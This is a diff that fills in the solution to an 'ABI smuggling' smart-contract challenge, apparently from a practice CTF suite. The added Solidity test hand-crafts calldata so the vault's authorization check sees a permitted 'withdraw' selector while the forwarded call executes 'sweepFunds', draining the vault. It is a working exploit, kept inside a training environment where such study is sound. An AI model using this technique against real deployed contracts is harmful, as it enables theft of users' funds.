@@ -73,7 +73,33 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // We are authorized to execute `withdraw` via the vault's executor,
+        // but `execute()` reads the selector from a fixed calldata offset (0x64).
+        // By providing a non-standard ABI encoding for the `bytes` parameter,
+        // we can make the permission check see `withdraw`, while the actual
+        // calldata forwarded executes `sweepFunds`.
+
+        bytes memory sweep = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, IERC20(address(token)));
+        assertEq(sweep.length, 4 + 32 * 2, "Unexpected sweep calldata length");
+
+        bytes32 targetWord = bytes32(uint256(uint160(address(vault))));
+        bytes32 offsetWord = bytes32(uint256(0x80));
+        bytes32 filler = bytes32(0);
+        bytes32 fakeSelectorWord = bytes32(uint256(uint32(vault.withdraw.selector)) << 224);
+        bytes32 lengthWord = bytes32(uint256(sweep.length));
+
+        bytes memory payload = abi.encodePacked(
+            vault.execute.selector,
+            targetWord,
+            offsetWord,
+            filler,
+            fakeSelectorWord,
+            lengthWord,
+            sweep
+        );
+
+        (bool ok,) = address(vault).call(payload);
+        require(ok, "execute failed");
     }
 
     /**
